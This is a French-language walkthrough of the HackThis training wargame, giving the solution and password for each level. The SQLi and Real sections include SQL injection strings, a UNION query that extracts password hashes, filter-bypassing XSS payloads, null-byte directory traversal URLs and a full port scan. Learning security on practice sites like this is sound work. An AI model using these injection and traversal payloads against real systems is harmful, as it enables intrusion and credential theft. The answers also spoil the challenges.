HackThis
========
https://www.hackthis.co.uk

#Main
##Level 1
regarder la source de la page. dans la partie head, remarquer :
```html
<!-- username: in, password: out -->
```

##Level 2
regarder la source de la page. le formulaire contient les information dans des balises span de la couleur du fond d'écran
```html
<label for="user">Username:</label> <span style="color: #000000">resu</span>
<label for="user">Password:</label> <span style="color: #000000">ssap</span>
```
##Level 3
regarder la source de la page. Elle contient une fonction javascript permettant de valider les informations du formulaire
```javascript
$(function(){ $('.level-form').submit(function(e){ if(document.getElementById('user').value == 'heaven' && document.getElementById('pass').value == 'hell') { } else { e.preventDefault(); alert('Incorrect login') } })})
```
##Level 4
regarder la source de la page. le formulaire contient un champ caché :
```html
<input type="hidden" name="passwordfile" value="extras/ssap.xml">
```
regarder la contenu du fichier https://www.hackthis.co.uk/levels/extras/ssap.xml
##Level 5
regarder la source de la page. la saisie du mot de passe et sa vérification sont faite en javascript.
```javascript
            var pass;
            pass=prompt("Password","");
            if (pass=="9286jas") {
                window.location.href="/levels/main/5?pass=9286jas";
            }
```
##Level 6
utiliser tamper data pour remplacer la chaine envoyée (par exemple John => Ronald)
##Level 7
l'indice indique "You wouldn't even find the page by using a search engine as search bots have been excluded."
regarder https://www.hackthis.co.uk/robots.txt
```
User-agent: *
Allow: /
Disallow: /contact.php
Disallow: /inbox/
Disallow: /levels/
Disallow: /levels/extras/userpass.txt
Disallow: /users/
Disallow: /ctf/8/php/*

User-agent: Mediapartners-Google
Disallow:

Sitemap: https://www.hackthis.co.uk/sitemap.xml
```
regarder https://www.hackthis.co.uk/levels/extras/userpass.txt
##Level 8
la source montre un champ caché dans le formulaire
```html
<input type="hidden" name="passwordfile" value="extras/secret.txt">
```
https://www.hackthis.co.uk/levels/extras/secret.txt
décoder le binaire en hexa
==> B00B/FEED

##Level 9
le formulaire contient 2 champs email (le second est un champ hidden prérempli)
envoyer la même adresse dans les 2 champs (différente de l'admin)

##Level 10
le formulaire contient un champ caché avec le nom du fichier de mot de passe
```html
<input type="hidden" name="passwordfile" value="level10pass.txt">
```
le fichier à décoder est : https://www.hackthis.co.uk/levels/extras/level10pass.txt
Hash MD5
```
21232f297a57a5a743894a0e4a801fc3 => admin
5f4dcc3b5aa765d61d8327deb882cf99 => password
```
#BASIC+
##Level 1
récupérer le fichier b1.txt
il commence par la signature BM6 (fichier BMP). on le renomme et on l'affiche. On obtient le login et le mot de passe.

##Level 2
utiliser useragent switcher ou tamper data pour changer le useragent du navigateur et mettre secure_user_agent

##Level 3
poster le score à la bonne adresse (ne fonctionne pas avec tamper data)
```html
<form method="post" action="https://www.hackthis.co.uk/levels/b3.php?submit">
        <input type="text" name="score" value="194175">
        <input type="submit">
</form> 
```

##Level 4
download b4.jpg
```
exiftool b4.jpg
ExifTool Version Number         : 9.34
File Name                       : b4.jpg
Directory                       : .
File Size                       : 90 kB
File Modification Date/Time     : 2013:11:01 19:04:01+01:00
File Access Date/Time           : 2014:10:14 18:27:20+02:00
File Inode Change Date/Time     : 2014:10:14 18:27:20+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 96
Y Resolution                    : 96
Resolution Unit                 : inches
Software                        : Microsoft Windows Photo Viewer 6.1.7600.16385
Modify Date                     : 2010:04:28 13:28:38
Artist                          : james
Y Cb Cr Positioning             : Co-sited
Exposure Time                   : 1/750
F Number                        : 8.4
Exposure Program                : Program AE
ISO                             : 100
Exif Version                    : 0220
Date/Time Original              : 2010:04:28 19:28:59
Create Date                     : 2010:04:28 19:28:59
Components Configuration        : Y, Cb, Cr, -
Compressed Bits Per Pixel       : 1.979816021
Shutter Speed Value             : 1/792
Aperture Value                  : 8.4
Exposure Compensation           : 0
Max Aperture Value              : 3.2
Metering Mode                   : Multi-segment
Light Source                    : Unknown
Flash                           : Auto, Did not fire
Focal Length                    : 6.3 mm
Maker Note Version              : STMN100
Preview Image Start             : 1063457536
Preview Image Length            : 3778281728
Warning                         : [minor] Bad format (1792) for MakerNotes entry 0
User Comment                    : I like chocolate
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 1944
Exif Image Height               : 2592
Related Sound File              : RelatedSound
Interoperability Index          : R98 - DCF basic file (sRGB)
Interoperability Version        : 0100
Exposure Index                  : 1
Sensing Method                  : One-chip color area
File Source                     : Digital Camera
Scene Type                      : Directly photographed
Exposure Mode                   : Auto
White Balance                   : Auto
Digital Zoom Ratio              : 0
Focal Length In 35mm Format     : 35 mm
Scene Capture Type              : Standard
Contrast                        : Normal
Saturation                      : Normal
Sharpness                       : Normal
Offset Schema                   : 4194
Padding                         : (Binary data 2060 bytes, use -b option to extract)
Compression                     : JPEG (old-style)
Thumbnail Offset                : 23352
Thumbnail Length                : 3392
XMP Toolkit                     : XMP Core 4.1.1-Exiv2
Creator Tool                    : Microsoft Windows Photo Viewer 6.1.7600.16385
Instance ID                     : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b
Image Width                     : 364
Image Height                    : 486
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:0 (1 2)
Aperture                        : 8.4
Image Size                      : 364x486
Preview Image                   : (Binary data 3778281728 bytes, use -b option to extract)
Scale Factor To 35 mm Equivalent: 5.6
Shutter Speed                   : 1/750
Thumbnail Image                 : (Binary data 3392 bytes, use -b option to extract)
Circle Of Confusion             : 0.005 mm
Field Of View                   : 54.4 deg
Focal Length                    : 6.3 mm (35 mm equivalent: 35.0 mm)
Hyperfocal Distance             : 0.87 m
Light Value                     : 15.7
```
user : james
pass : chocolate

##Level 5
Télécharger le fichier b5.jpg
l'éditer avec un éditeur texte.
à la fin, on remarque : 
```
user: admin
pass: safe
```
on peut aussi remarquer la présence de la signature d'un fichier ZIP (PK). En prenant les 141 derniers octets du fichier on a un zip contenant le fichier secret.txt avec les informations ci-dessus.

##Level 6
nslookup www.hackthis.co.uk => 178.17.41.47
traceroute 178.17.41.47 => allsimple
afficher la source du mail de confirmation : X-B6-Key: Lajklsb#!"3jlak

##Level 7
faire un scan de port du serveur
```nix
cyril:~ # nmap -v -T 4 -p1-65535 www.hackthis.co.uk

Starting Nmap 6.40 ( http://nmap.org ) at 2014-10-15 13:14 CEST
Initiating Ping Scan at 13:14
Scanning www.hackthis.co.uk (178.17.41.47) [4 ports]
Completed Ping Scan at 13:14, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:14
Completed Parallel DNS resolution of 1 host. at 13:14, 0.04s elapsed
Initiating System CNAME DNS resolution of 1 host. at 13:14
Completed System CNAME DNS resolution of 1 host. at 13:14, 0.00s elapsed
Initiating SYN Stealth Scan at 13:14
Scanning www.hackthis.co.uk (178.17.41.47) [65535 ports]
Discovered open port 443/tcp on 178.17.41.47
Discovered open port 8080/tcp on 178.17.41.47
Discovered open port 80/tcp on 178.17.41.47
SYN Stealth Scan Timing: About 4.36% done; ETC: 13:26 (0:11:20 remaining)
SYN Stealth Scan Timing: About 8.83% done; ETC: 13:25 (0:10:30 remaining)
SYN Stealth Scan Timing: About 13.66% done; ETC: 13:25 (0:09:54 remaining)
SYN Stealth Scan Timing: About 18.49% done; ETC: 13:25 (0:09:07 remaining)
SYN Stealth Scan Timing: About 23.84% done; ETC: 13:25 (0:08:31 remaining)
SYN Stealth Scan Timing: About 28.68% done; ETC: 13:25 (0:07:52 remaining)
SYN Stealth Scan Timing: About 33.79% done; ETC: 13:25 (0:07:17 remaining)
Discovered open port 6776/tcp on 178.17.41.47
SYN Stealth Scan Timing: About 39.87% done; ETC: 13:25 (0:06:40 remaining)
SYN Stealth Scan Timing: About 45.16% done; ETC: 13:25 (0:06:06 remaining)
SYN Stealth Scan Timing: About 50.32% done; ETC: 13:25 (0:05:27 remaining)
SYN Stealth Scan Timing: About 57.10% done; ETC: 13:25 (0:04:51 remaining)
^C
cyril:~ # telnet www.hackthis.co.uk 6776
Trying 178.17.41.47...
Connected to www.hackthis.co.uk.
Escape character is '^]'.
Welcome weary traveller. I believe you are looking for this: mapthat
Connection closed by foreign host.

```

#Intermediate
##Level 1
https://www.hackthis.co.uk/levels/intermediate/1?password=flubergump

##Level 2
```html
<form method="post" action="https://www.hackthis.co.uk/levels/intermediate/2">
<input type="text" name="password" value="flubergump">
<input type="submit">
</form>
```
##Level 3
Cookie restricted_login=false => true

##Level 4
le filtre supprime les balises.
```
<script<script>>alert('HackThis!!');</script</script>>
```
##Level 5
username : a from 127.0.0.1\n

##Level 6

#Javascript
##Level 1
affichier la source
le script de vérification du mot de passe utilise la variable correct définie à la fin de la page html
```html
<script type='text/javascript'> var correct = 'jrules' </script>
```

##Level 2
afficher la source
```html
        <script type='text/javascript'> $(function(){ $('.level-form').submit(function(e){ e.preventDefault(); if ($('.level-form #pass')[0].value.length == length) { document.location = "2?x=" + length; } else { alert('Incorrect Password'); } }); }); </script>
```
le script vérifie la taille du mot de passe.
avec un scratchpad :
```javascript
alert(length);
```
saisir une chaine de 9 caractères

##Level 3

afficher la source
```html
<script type='text/javascript'> var thecode = 'code123'; $(function(){ $('.level-form').submit(function(e){ e.preventDefault(); if ($('.level-form #pass')[0].value == thecode) { document.location = "?pass=" + thecode; } else { alert('Incorrect Password'); } }); }); </script>
```
dans un scratchpad :
```javascript
alert(thecode);
```
==> getinthere

##Level 4
la page https://www.hackthis.co.uk/levels/javascript/4 redirige vers https://www.hackthis.co.uk/levels/javascript/4?input
en récupérant le code de la première page avec la redirection, on a 
```html
<script> document.location = '?input'; </script>
<div class='center'>The password is: smellthecheese</div>
```
##Level 5
on recherche "prompt" dans les js avec les outils de dev firefox.
```html
timer=setTimeout(searchsuggest,200);});});a=window.location.host+"";b=a.length;c=4+((5*10)*2);d=String.fromCharCode(c,-(41-Math.floor(1806/13)),Math.sqrt(b-2)*29,(b*8)-29);p=prompt("Password:","");if(p==d){window.location="?pass="+p;}else{window.location="/levels/";}
```
dans le scratchpad :
```javascript
alert(d);
```
==> hats

#SQLi
##Level 1
login = mdp = ' or '1'='1

##Level 2
afficher les comptes et sélectionner une lettre.
remplacer q=... par q=%' and admin='1' union select password, admin from members where admin like '1%'='
on a un seul utilisateur : bellamond et son mot de passe 1b774bc166f3f8918e900fcef8752817bae76a37
google => http://md5.znaet.org/md5/1cd30461f1450f450c4fc598afe5c6d5#.VD5mv7t_wW0
c'est le sha1 de sup3r

#Coding
##Level 1
dans un scratchpad
```javascript
var textareas = document.getElementsByTagName("textarea");
var values = textareas[0].value;
var vals = values.split(", ");
vals.sort();
textareas[1].value = vals.join(", ")
```
run, submit

##Level 2
dans un scratchpad
```javascript
var textareas = document.getElementsByTagName("textarea");
var values = textareas[0].value;
var vals = values.split(",");
var result = ""

for(i=0; i<vals.length ; i++) {
  if (vals[i] == ' ') {
    result += vals[i];
  } else {
   result += String.fromCharCode(31+127-parseInt(vals[i]));
  }
}

textareas[1].value = result;
```
run, submit
#Crypt
##Level 1
renverser la chaine.
```
Hello, welcome to the crypt levels on hackthis. These levels are all about decryption and logic, you will need to employ a lot of brain power. To complete this level enter this pass: woocrypt
```
##Level 2
CAESAR Shift Code (http://crypo.in.ua/tools/eng_caesar.php) avec un décalage de 4 caractères
```
Welcome back, this level is not as easy as the last but still not too challenging. So go ahead and enter this pass: shiftthatletter  
```

##Levek 3
Morse (http://www.dcode.fr/code-morse)
```
HI, THANKS TO SAMUEL MORSE THE TRANSMISSION OF TELEGRAPHIC INFORMATION WAS STANDARDIZED. HE USED DOTS AND DASHES TO CREATE A STANDARD WAY OF COMMUNICATION, HE HAS HELPED YOU TODAY TO GET THE PASS: THANKYOUSIR
```
mettre en minuscules

##Level 4
substitution d'alphabet
http://www.chaos.org.uk/~eddy/craft/substitute.html
In	CQGLHDNSKMZJ.ARUWY,:O
Out         IETSAHRLDNOP.FMWVC,:G
```
Hi, this is a similar idea to level two. This time each letter is assigned a specified relationship with another letter. Pass: ihavefriends 
```

#Level 5
inverser la chaine
substituer :
In	YILODNPTCQMEZGHK.FSW,AJX:B
Out         tieoamhysrnlugfc.pkw,dbv:j
(Hacker Manifesto)
```
Yes i am a criminal. My crime is that of curiosity. My crime is that of judging people by what they say and think, not what they look like. My crime is that of outsmarting you, Something that you will never forgive me for. But the pass: TheMentor
```
#Captcha
##Level 1
Cf. ocr.js

##Level 2
Cf. ocr2.js

#Forensics
utiliser photorec pour récupérer les fichiers
mot de passe du rar : 123
décodage des DTMF avec http://www.dialabc.com/sound/detect/index.html ==> AA6B A4A8 3C67 DDC7
en utilisant le même format que dans un des fichiers txt, le code est AA6B-A4A8-3C67-DDC7

#Real
##Level 1
Read mail in trash
```
From: 'uStudio'
Subject: Password Request
You have requested your password. Your password is:
iamgod

We suggest you delete this email immediately!! 
```

##Level 2
regarder la source
```javascript
var username= document.getElementById('username').value;
var password= document.getElementById('password').value;
URL= "members/" + username + " " + password + ".htm";
```
aller dans le répertoire members :
```
[TXT]	anna god.htm	01-Nov-2013 18:04 	0 	 
[TXT]	dave fish_r_friends.htm	01-Nov-2013 18:04 	0 	 
[TXT]	jack kack.htm	01-Nov-2013 18:04 	0 	 
[TXT]	librarian sweetlittlebooks.htm	01-Nov-2013 18:04 	0 	 
[TXT]	luke 9312.htm	01-Nov-2013 18:04 	0 	 
[ ]	sam sam	01-Nov-2013 18:04 	0 	 
```
on a la liste des users/password
se connecter en tant que librarian

##Level 3
rechercher des informations sur le script utilisé :
```javascript
// Login version 4.2 june 2000 Copyright D10n...

// Courtesy of SimplytheBest.net (http://simplythebest.net/scripts/DHTML_scripts/)
```
http://codingforums.com/javascript-programming/4939-hellp-savascript-login.html
```
 members.js - List of Members, Passwords and Destinations.
```
contenu : 
```javascript
m[m.length]=new Array("Admin","password","Home","/levels/real/3?pw=password");
m[m.length]=new Array("John T","sheeprule","Home2","/levels/real/3?pw=newsheep");
m[m.length]=new Array("Temp","password","Loloips","http://www.google.com");
```
se connecter en tant que "John T"
## Level 4
PlanetBid : se connecter en tant qu'admin, avec "asdfg" comme mot de passe (top 10 des mots de passe)

remarquer le message :
```
 Your IP has been logged for security reasons. [view] 
```
cliquer sur view, puis clear logs

consulter la base des membres :
31	Revoked.Mayhem	Caffe@hotbiz.com

consulter la base des ventes avec pour vendeur l'id 31
31	11	Dr Pepper 3ltr RARE	£1.32

l'acheteur est l'utilisateur 11
11	nemisis	jfelliot@mail.com

on remarque l'url : https://www.hackthis.co.uk/levels/extras/real/4/planetbid/view.php?members&1=user&2=email
changer email en pass
https://www.hackthis.co.uk/levels/extras/real/4/planetbid/view.php?members&1=user&2=pass
on obtient les hash des mots de passe :
11	nemisis	742929dcb631403d7c1c1efad2ca2700
=> chicken
31	Revoked.Mayhem	231b79b81be75c6fdaabb59754efc025
=> westwoodworld

on peut maintenant se connecter à l'email avec le login : jfelliot et le mot de passe chicken

récupérer le mot de passe sur safe transfer user nemisis, email jfelliot@mail.com
```
 You have requested your details on Safe Transfer
If you have not requested these details then someone is probably trying to illegally gain access to your account.
Username: nemisis
Password: i.am.awesome
```
se connecter sur safe transfer avec le user nemisis et le mot de passe du mail.
effectuer un transfer de 1.32 vers le compte 64957746

## Level 5
Sélectionner un des liens (home, news, contact). on remarque ?p=<nompage>
si on enlève nompage :
```
Warning: file_get_contents(.html) [function.file-get-contents]: failed to open stream: No such file or directory in pages on line 22 
```
injection null byte :
https://www.hackthis.co.uk/levels/extras/real/5/?p=admin.php%00
==> No such file or directory
directory traversal :
https://www.hackthis.co.uk/levels/extras/real/5/?p=../admin.php%00
==> on voit le formulaire. en affichant la source, on obtient le mot de passe = princesslovetoast

## Level XMAS
lien "write to santa" => submit
on enlève le paramètre ?submit
on a un formulaire d'authentification : https://www.hackthis.co.uk/levels/extras/real/xmas/mod.php

login = mot de passe = ' or '1'='1

on edite index.php et on met le code de la page alternative. submit

## Level 6
XSS sur le formulaire de contact :
en envoyant :
```
*/</script>
*/alert('lol');/*
<script>/*
```
le code s'exécute sur la page avec le formulaire
